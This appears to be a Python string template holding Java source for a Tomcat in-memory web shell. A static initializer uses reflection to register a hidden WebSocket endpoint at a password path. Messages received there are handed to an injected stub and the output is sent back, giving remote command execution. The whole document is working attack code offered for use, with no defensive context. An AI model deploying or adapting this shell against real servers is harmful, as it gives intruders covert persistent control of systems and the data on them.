code = """
import javax.servlet.ServletContext;
import javax.websocket.*;
import javax.websocket.server.ServerContainer;
import javax.websocket.server.ServerEndpointConfig;
import java.lang.reflect.*;
import java.util.*;

public class TomcatWsFilter extends Endpoint
        implements MessageHandler.Whole<String>
{{
    private static String password = "/{password}";

    private static Session session = null;
    private static Object lock = new Object();

    private ClassLoader getLoader() {{
        return Thread.currentThread().getContextClassLoader();
    }}

    private Field getField(Object obj, String fieldName) {{
        Class clazz;
        Field field = null;
        if (obj == null) {{
            return null;
        }}
        if (obj instanceof Class) {{
            clazz = (Class) obj;
        }} else {{
            clazz = obj.getClass();
        }}
        while (clazz != null) {{
            try {{
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            }} catch (NoSuchFieldException e) {{
                clazz = clazz.getSuperclass();
            }}
        }}
        if (field != null) {{
            field.setAccessible(true);
        }}
        return field;
    }}

    private Object getFieldValue(Object obj, String fieldName) {{
        Field field;
        if (obj instanceof Field) {{
            field = (Field) obj;
        }} else {{
            field = getField(obj, fieldName);
        }}
        try {{
            return field.get(obj);
        }} catch (IllegalAccessException e) {{
            return null;
        }}
    }}

    private Method getMethodX(Class clazz, String methodName, int num) {{
        Method[] methods = clazz.getDeclaredMethods();
        for (Method method : methods) {{
            if (method.getName().equals(methodName)) {{
                if (method.getParameterTypes().length == num) {{
                    return method;
                }}
            }}
        }}
        return null;
    }}

    private Method getMethod(Class clazz, String methodName, Class... args) {{
        Method method = null;
        while (clazz != null) {{
            try {{
                method = clazz.getDeclaredMethod(methodName, args);
                clazz = null;
            }} catch (NoSuchMethodException e) {{
                clazz = clazz.getSuperclass();
            }}
        }}
        return method;
    }}

    private Object invokeMethod(
        Object obj, String methodName, Object... args
    ) {{
        ArrayList clazzs = new ArrayList();
        if (args != null) {{
            for (int i=0; i<args.length; i++) {{
                Object arg = args[i];
                if (arg != null) {{
                    clazzs.add(arg.getClass());
                }} else {{
                    clazzs.add(null);
                }}
            }}
        }}
        Method method = getMethod(
            obj.getClass(), methodName,
            (Class[]) clazzs.toArray(new Class[]{{}})
        );
        try {{
            return method.invoke(obj, args);
        }} catch (Exception e) {{
            return null;
        }}
    }}

    private byte[] b64decode(String payload) {{
        Class base64;
        byte[] bytes = null;
        try {{
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null)
                .invoke(base64, null);
            bytes = (byte[]) decoder.getClass()
                .getMethod("decode", new Class[] {{String.class}})
                .invoke(decoder, new Object[] {{payload}});
        }} catch (ClassNotFoundException e) {{
            try {{
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                bytes = (byte[])decoder.getClass()
                    .getMethod("decodeBuffer", new Class[] {{String.class}})
                    .invoke(decoder, new Object[] {{payload}});
            }} catch (Exception ex) {{}}
        }} catch (Exception ex) {{}}
        return bytes;
    }}
{context}
{decoder}
{stub}
    @Override
    public void onOpen(Session s, EndpointConfig epc) {{
        session = s;
        s.addMessageHandler(this);
    }}

    @Override
    public void onMessage(String m) {{
        try {{
            session.getBasicRemote().sendText(stub(m, null, null));
        }} catch (Exception e) {{
            try {{
                session.getBasicRemote().sendText(e.toString());
            }} catch (Exception ex) {{}}
        }}
    }}

    private void addWsFilter() throws Exception {{
        ServletContext servletContext = (ServletContext) invokeMethod(
            getStandardContext(), "getServletContext"
        );
        ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder
            .create(TomcatWsFilter.class, password).build();
        ServerContainer container = (ServerContainer) servletContext
            .getAttribute(ServerContainer.class.getName());
        if (servletContext.getAttribute(password) == null) {{
            container.addEndpoint(configEndpoint);
            servletContext.setAttribute(password, password);
        }}
    }}

    public TomcatWsFilter() {{
        synchronized(lock) {{
            try {{
                addWsFilter();
            }} catch (Exception e) {{}}
        }}
    }}

    static {{
        new TomcatWsFilter();
    }}
}}
"""